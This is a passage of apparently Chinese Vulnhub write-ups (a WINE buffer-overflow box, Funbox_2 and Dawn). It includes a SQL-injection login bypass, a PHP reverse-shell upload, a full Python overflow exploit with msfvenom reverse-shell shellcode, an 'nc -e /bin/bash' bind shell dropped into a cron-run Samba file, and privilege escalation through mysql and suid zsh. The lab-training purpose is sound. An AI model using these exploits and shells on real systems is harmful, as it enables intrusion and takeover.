<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>SQL注入</li>
<li>信息泄露</li>
<li>文件上传</li>
<li>密码破解</li>
<li>WINE</li>
<li>缓冲区溢出</li>
<li>EXP代码编写</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.30</span><br><span class="line">sudo nmap -p22,23,80 -A 10.0.2.30</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507182321.png" /></p>
<p>信息很常规，多了一个23端口，尝试用nc连接，但是无论输入什么命令都会直接断开。因此，直接访问80断开</p>
<h2 id="访问http服务-get-shell">2.2. 访问http服务 + get shell</h2>
<p>页面就是一个登录界面，测试发现存在SQL注入，直接万能密码登录。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: -1&#x27;or 1=1-- </span><br><span class="line">password: 随便</span><br></pre></td></tr></table></figure></p>
<p>直接进入后台，并且是administrator用户。查看源码发现一句可疑的注释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &lt;a href=&quot;index.php?page=site_settings&quot; class=&quot;nav-item nav-site_settings&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接访问，发现存在文件上传的功能点，测试了一下，可以上传php文件。但是，上传成功之后不知道路径，因此接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.30/student_attendance</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507183111.png" /></p>
<p>在 assets 目录下存在upload的目录，在里面找到刚刚上传的php文件，不过名字被改了。</p>
<p>直接上传 /usr/share/webshells/php/php-reverse-shell.php 文件，然后访问即可反弹shell（需要修改ip和端口）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507183416.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>我查看了所有常用的权限提升的办法，都没有用，最后在/root目录下发现了一个 win 文件和一个 .wine 目录。win文件的内容如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">  wine /opt/access/access.exe</span><br><span class="line">  sleep 3</span><br><span class="line"> <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>查看/opt/access目录下除了存在access.exe之后，还有一个funcs_access.dll。这两个都是典型的Windows下的文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507183731.png" /></p>
<p>并且 access.exe 是root权限运行的。除此之外，没有任何可以使用的信息，虽然存在mysql，但是运行权限太低，没有作用。</p>
<p>接下来就是wine缓冲区溢出漏洞。先将这两个文件都上传到Windows主机上。然后需要两个工具：</p>
<ol type="1">
<li>immunity debugger</li>
<li>mona.py</li>
</ol>
<p>使用immunity debugger打开access.exe，并且运行</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507184611.png" /></p>
<p>kali编写如下代码，通过不断修改，确定字符的位置 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2000</span></span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&quot;10.0.2.31&quot;</span>, <span class="number">23</span>)) <span class="comment"># 启动access.exe的主机</span></span><br><span class="line">	s.send(buffer)</span><br><span class="line">	s.close()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;\nDone&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Error&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>查看Windows进程可以发现，当启动access.exe的时候，23端口被打开，因此推测该程序将会监听23端口。靶机上也是如此。</p>
<p>这里其实就是在Windows上做了以下几步：</p>
<ol type="1">
<li>查看是否存在缓冲区溢出漏洞</li>
<li>找字符位置</li>
<li>找jump esp（利用mona.py，这里需要注意找那些都是false的模块）</li>
<li>测坏字符。不同环境下能够运行的字符都不同，</li>
</ol>
<p>不想演示了，Windows操作太烂了</p>
<p>直接给出poc.py: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">buf=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">target_ip=<span class="string">&#x27;10.0.2.30&#x27;</span></span><br><span class="line">target_port=<span class="number">23</span></span><br><span class="line">recv_buf=<span class="number">4096</span></span><br><span class="line">junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">1902</span></span><br><span class="line">ret_addr=<span class="string">b&#x27;\xd0\x12\x50\x62&#x27;</span></span><br><span class="line">nops=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">32</span>  <span class="comment">#  可选</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x76\x0e\xf7\xf1\xce\x10\x83\xee\xfc\xe2\xf4\x0b\x19&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x10\xf7\xf1\xae\x99\x12\xc0\x0e\x74\x7c\xa1\xfe&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x9b\xa5\xfd\x45\x42\xe3\x7a\xbc\x38\xf8\x46\x84\x36&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc6\x0e\x62\x2c\x96\x8d\xcc\x3c\xd7\x30\x01\x1d\xf6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x36\x2c\xe2\xa5\xa6\x45\x42\xe7\x7a\x84\x2c\x7c\xbd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xdf\x68\x14\xb9\xcf\xc1\xa6\x7a\x97\x30\xf6\x22\x45&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\xef\x12\xf4\x59\x7c\xc5\x45\x11\x21\xc0\x31\xbc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x36\x3e\xc3\x11\x30\xc9\x2e\x65\x01\xf2\xb3\xe8\xcc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8c\xea\x65\x13\xa9\x45\x48\xd3\xf0\x1d\x76\x7c\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\x9b\xaf\xed\xcf\xc3\x7c\xf5\x45\x11\x27\x78\x8a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\xd3\xaa\x95\x71\xae\xab\x9f\xef\x17\xae\x91\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\xe3\x25\x9d\xaa\x99\xfd\x22\xf7\xf1\xa6\x67\x84&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc3\x91\x44\x9f\xbd\xb9\x36\xf0\x0e\x1b\xa8\x67\xf0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xce\x10\xde\x35\x9a\x40\x9f\xd8\x4e\x7b\xf7\x0e\x1b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x40\xa7\xa1\x9e\x50\xa7\xb1\x9e\x78\x1d\xfe\x11\xf0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x08\x24\x59\x7a\xf2\x99\xc4\x10\xf5\xea\xa6\x12\xf7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe4\x7d\x99\x11\x9b\xde\x46\xa0\x99\x57\xb5\x83\x90&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc5\x72\x31\xba\x1c\x08\xbf\xc6\x65\x1b\x99\x3e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa5\x55\xa7\x31\xc5\x9f\x92\xa3\x74\xf7\x78\x2d\x47&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\xa6\xff\xe6\x9d\xe3\x97\x46\x15\x0c\xa8\xd7\xb3&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd5\xf2\x11\xf6\x7c\x8a\x34\xe7\x37\xce\x54\xa3\xa1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x98\x46\xa1\xb7\x98\x5e\xa1\xa7\x9d\x46\x9f\x88\x02&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x2f\x71\x0e\x1b\x99\x17\xbf\x98\x56\x08\xc1\xa6\x18&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x70\xec\xae\xef\x22\x4a\x3e\xa5\x55\xa7\xa6\xb6\x62&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x53\xef\x22\xcd\xc8\x6c\xfd\x71\x35\xf0\x82\xf4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x75\x57\xe4\x83\xa1\x7a\xf7\xa2\x31\xc5&quot;</span>    </span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += junk</span><br><span class="line">payload += ret_addr</span><br><span class="line">payload += nops</span><br><span class="line">payload += buf</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET,socket.SOCK_STREAM) <span class="keyword">as</span> clientSock:</span><br><span class="line">    clientSock.connect((target_ip,target_port))</span><br><span class="line">    data_from_srv = clientSock.recv(recv_buf)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Reply --&gt; <span class="subst">&#123;data_from_srv&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sending --&gt; <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    clientSock.sendall(payload)</span><br></pre></td></tr></table></figure></p>
<p>中间一大串shellcode通过下面命令生成 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.27 LPORT=5555 -b <span class="string">&#x27;\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f&#x27;</span> -f python</span><br></pre></td></tr></table></figure></p>
<p>-b 后面跟的是坏字符</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507191601.png" /></p>
<p>获得的shell其实是wine搭建的模拟Windows环境的shell，而靶机/root/.wine/dosdevices目录下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507191756.png" /></p>
<p>Z 目录就连接到靶机的根目录。此时可以查看/root/proof.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Z:\root&gt;<span class="built_in">type</span> proof.txt</span><br><span class="line">ccc34dede451108a8fe6f75d6ea7d2ae</span><br></pre></td></tr></table></figure></p>
<p>还有一个flag在/home/fox/local.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Z:\root&gt;<span class="built_in">type</span> proof.txt</span><br><span class="line">ccc34dede451108a8fe6f75d6ea7d2ae</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>本题对于获得shell并不难，缓冲区溢出也不难，难就难在这是Windows环境下的缓冲区溢出。。。。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>WINE</tag>
        <tag>缓冲区溢出</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>28 Vulnhub Funbox_2 Writeup</title>
    <url>/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/funbox-rookie,520/">Funbox: Rookie ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>FTP服务漏洞</li>
<li>密码爆破</li>
<li>ssh公钥认证</li>
<li><strong>rbahs逃逸</strong></li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.32</span><br><span class="line">sudo nmap -p21,22,80 -A 10.0.2.32</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508084033.png" /></p>
<h2 id="http服务">2.2. http服务</h2>
<p>根据扫描的结果，靶机的80端口上存在着robots.txt，里面泄露了一个目录/logs/，但是靶机并没有该目录。</p>
<p>路径扫描也没有任何有用的信息。看来突破点应该在ftp上。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>ftp服务的版本是proftp 1.3.5e，搜索是否存在exploit <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit proftp 1.3.5</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508105057.png" /></p>
<p>虽然显示3个，但是其实针对的都是同一个漏洞。经测试，都无法成功，可能是因为靶机是1.3.5e，还是与1.3.5有所差别。</p>
<p>frp服务可以匿名登录，从扫描结果来看，存在着许多zip文件，将所有内容全部下载到kali，然后尝试解压。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ftp 10.0.2.32 21</span><br><span class="line">2. username: anonymous, password: 直接enter</span><br><span class="line">3. mget *  <span class="comment"># 下载所有文件</span></span><br><span class="line">4. get .@users  <span class="comment"># 下载隐藏文件</span></span><br><span class="line">5. get .@admins <span class="comment"># 下载隐藏文件</span></span><br></pre></td></tr></table></figure></p>
<p>首先查看welcome.msg, .@users, .@admins <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat welcome.msg                                                                                                                                               82 ⨯</span><br><span class="line">Welcome, archive user %U@%R !</span><br><span class="line"></span><br><span class="line">The <span class="built_in">local</span> time is: %T</span><br><span class="line"></span><br><span class="line">This is an experimental FTP server.  If you have any unusual problems,</span><br><span class="line">please report them via e-mail to &lt;root@%L&gt;.</span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat .@users                                                                                                                                                    1 ⨯</span><br><span class="line">Hi Users,</span><br><span class="line"></span><br><span class="line">be carefull with your keys. Find them <span class="keyword">in</span> %yourname%.zip.</span><br><span class="line">The passwords are the old ones.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat .@admins        </span><br><span class="line">SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290&quot;</span>|base64 -d</span><br><span class="line">Hi Admins,</span><br><span class="line"></span><br><span class="line">be carefull with your keys. Find them <span class="keyword">in</span> %yourname%.zip.</span><br><span class="line">The passwords are the old ones.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p>
<p>从这些信息中得知，这些压缩文件里面存放的是对应用户/root的登录key，并且这些压缩文件的加密密码都比较老</p>
<p>尝试解压，可以发现里面的内容是id_rda，也就是可以ssh公钥认证登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ unzip anna.zip              </span><br><span class="line">Archive:  anna.zip</span><br><span class="line">[anna.zip] id_rsa password: </span><br></pre></td></tr></table></figure></p>
<p>接下来使用john进行暴力破解： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip2john anna.zip &gt; anna</span><br><span class="line">john anna --wordlist=../rockyou.txt</span><br></pre></td></tr></table></figure></p>
<p>在对所有的压缩文件进行破解后，只有两个可以被破解 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cathrine.zip -&gt; catwoman</span><br><span class="line">tom.zip      -&gt; iubire</span><br></pre></td></tr></table></figure></p>
<p>两个解压得到的id_rda内容是一样的，接下来尝试用cathrine和tom进行ssh登录，发现只有tom能够登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh tom@10.0.2.32 -i id_rsa</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508103627.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>登录tom之后进行信息收集，在/home/tom中的.mysql_history中发现了疑似tom的密码的字段 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_HiStOrY_V2_</span><br><span class="line">show\040databases;</span><br><span class="line">quit</span><br><span class="line">create\040database\040&#x27;support&#x27;;</span><br><span class="line">create\040database\040support;</span><br><span class="line">use\040support</span><br><span class="line">create\040table\040users;</span><br><span class="line">show\040tables</span><br><span class="line">;</span><br><span class="line">select\040*\040from\040support</span><br><span class="line">;</span><br><span class="line">show\040tables;</span><br><span class="line">select\040*\040from\040support;</span><br><span class="line">insert\040into\040support\040(tom,\040xx11yy22!);</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p>
<p>其中<code>\040</code>应该是空格，xx11yy22! 怀疑是tom的密码。</p>
<p>尝试sudo -l，输入上述字符串，成功执行，果然是密码</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508103920.png" /></p>
<p>并且tom可以使用sudo执行所有命令，直接切换成root <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su 或者 su root</span><br></pre></td></tr></table></figure></p>
<p>直接读取flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@funbox2:~<span class="comment"># cat flag.txt</span></span><br><span class="line">   ____  __  __   _  __   ___   ____    _  __             ___ </span><br><span class="line">  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |</span><br><span class="line"> / _/  / /_/ /  /    /  / _  |/ /_/ / _&gt;  &lt;             / __/ </span><br><span class="line">/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ </span><br><span class="line">           ____ ___  ___  / /_ ___  ___/ /       / /          </span><br><span class="line"> _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           </span><br><span class="line">(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            </span><br><span class="line">                                                              </span><br><span class="line">from @0815R2d2 with ♥</span><br></pre></td></tr></table></figure></p>
<h3 id="rbash逃逸">2.4.1. rbash逃逸</h3>
<p>参考文章：<a href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过 - 云+社区 - 腾讯云</a></p>
<p>其实我在使用LinEnum.sh进行信息收集的时候出现了错误，当我执行该文件的时候 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@funbox2:~$ ./LinEnum.sh </span><br><span class="line">-rbash: ./LinEnum.sh: restricted: cannot specify `/<span class="string">&#x27; in command names</span></span><br></pre></td></tr></table></figure></p>
<p>注意前面的rbash，我去搜索了一下，发现这是受限制的bash，无法执行一些命令。因此根据参考文章绕过，直接使用vi绕过。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508104504.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508104518.png" /></p>
<p>然后就成功绕过了。</p>
<p>这里介绍另一种参考文章没介绍的，利用mysql。</p>
<p>首先使用sudo权限登录mysql，然后利用mysql执行系统命令，生成一个新的shell进程 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@funbox2:~$ sudo mysql -u tom -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.7.30-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; system bash</span><br><span class="line">root@funbox2:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>这样子不仅绕过了rbash，还顺便提权了，哈哈哈哈哈哈哈。</p>
<h3 id="番外">2.4.2. 番外</h3>
<p>提权还可以使用对Ubuntu专用漏洞——CVE-2021-3493，测试可行。</p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度较简单，但还是学到了新的知识点：rbash逃逸。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>rbash逃逸</tag>
        <tag>zip密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>29 Vulnhub Dawn Writeup ⭐</title>
    <url>/2022/05/08/29%20Vulnhub%20Dawn%20Writeup%20%E2%AD%90/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/sunset-dawn,341/">sunset: dawn ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>Samba漏洞</li>
<li>任意文件上传</li>
<li>日志信息泄露</li>
<li>调度任务</li>
<li>密码爆破</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.33</span><br><span class="line">sudo nmap -p80,139,445,3306 -A 10.0.2.33</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508112008.png" /></p>
<p>其中samba支持guest登录，也就是不需要密码就能够登录成功。</p>
<h2 id="samba服务">2.2. samba服务</h2>
<p>首先查看samba共享的文件夹有哪些： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L 10.0.2.33</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508135425.png" /></p>
<p>其中 print$ 是打印机，IPC$ 是进程间通信的。只有第二个，还给了一个提示。因此，直接尝试连接该文件夹 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.0.2.33\\ITDEPT  <span class="comment"># 需要转义</span></span><br></pre></td></tr></table></figure></p>
<p>经过测试，发现文件夹下虽然没有文件，但是我们可以上传文件，还可以创建文件夹等。</p>
<h2 id="http服务">2.3. http服务</h2>
<p>访问主页面，发现页面好像还在搭建中，并没有任何有用的信息。接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.33</span><br></pre></td></tr></table></figure></p>
<p>发现了一个类似日志的可疑目录 /logs/，直接访问它，有4个文件，但是只有management.log能够下载，其他都没有权限。</p>
<p>查看这个日志</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508135920.png" /></p>
<p>发现这个日志好像是通过pspy64工具，将结果重定向到日志里，仔细观察日志，可以发现跟ITDEPT有关的文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508140032.png" /></p>
<p>可以看到/ITDEPT目录下的两个文件，product-control和web-control一直被执行。我们可以过一段时间再去下载这个日志，就能明显的看到。</p>
<h2 id="get-shell">2.4. get shell</h2>
<p>我们通过samba向ITDEPT目录传入与这两个文件同名的文件，这样子这个文件就会被执行，即可反弹shell。</p>
<p>这回用一个正向连接的命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash -lvp 1234&quot;</span> &gt; web-control</span><br><span class="line">连接samba，然后</span><br><span class="line">put web-control</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508140449.png" /></p>
<p>过一两分钟后，这个文件被执行，靶机上将会监听1234端口，然后我们连接靶机： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.33 1234</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508140555.png" /></p>
<p>当然也可以用之前的反弹shell的命令。</p>
<p>这里最好使用product-control文件，因为这个文件是由uid=1000的用户执行的，web-control文件由uid=33执行的，前者为dawn，后者为www-data。如果使用后者，则还需要提权到普通用户。</p>
<h2 id="权限提升">2.5. 权限提升</h2>
<p>本题目有许多权限提升的方法。</p>
<h3 id="sudo-mysql">2.5.1. sudo + mysql</h3>
<p>查看/home/dawn/.bash_history的内容（重要内容如下） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;$1$$bOKpT2ijO.XcGlpjgAup9/&quot;  # $_$_$ 第1，2个$之间为加密算法，2，3个之间为salt，这是Linux上保存的密码的形式</span><br><span class="line">sudo /usr/bin/mysql -u root  -p</span><br><span class="line">sudo -l </span><br><span class="line">zsh</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<p>首先 sudo -l</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508141407.png" /></p>
<p>可以sudo登录mysql，但是需要密码，将得到的hash值用john破解，得到:onii-chan29</p>
<p>使用该密码登录MySQL</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508141949.png" /></p>
<p>输入 <code>\! sh</code> 提权为root</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508143725.png" /></p>
<p>最后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat  /root/flag.txt</span><br><span class="line">Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!</span><br><span class="line"></span><br><span class="line">flag&#123;3a3e52f0a6af0d6e36d7c1ced3a9fd59&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="suid">2.5.2. suid</h3>
<p>利用下面命令查找suid文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508143907.png" /></p>
<p>zsh也是一个shell，属主为root，且具有suid权限，直接执行下面命令即可提权： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508144009.png" /></p>
<h3 id="密码">2.5.3. 密码</h3>
<p>提权到root之后查看：</p>
<p>在/home/ganimedes/.bash_history里面找到了root的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br><span class="line">thisisareallysecurepasswordnooneisgoingtoeverfind</span><br></pre></td></tr></table></figure></p>
<p>猜测应该可以先提权到ganimedes，然后再利用切换到root</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508144158.png" /></p>
<h3 id="crontab">2.5.4. crontab</h3>
<p>也是一样的，提权到root之后查看/var/www/html/logs</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508144308.png" /></p>
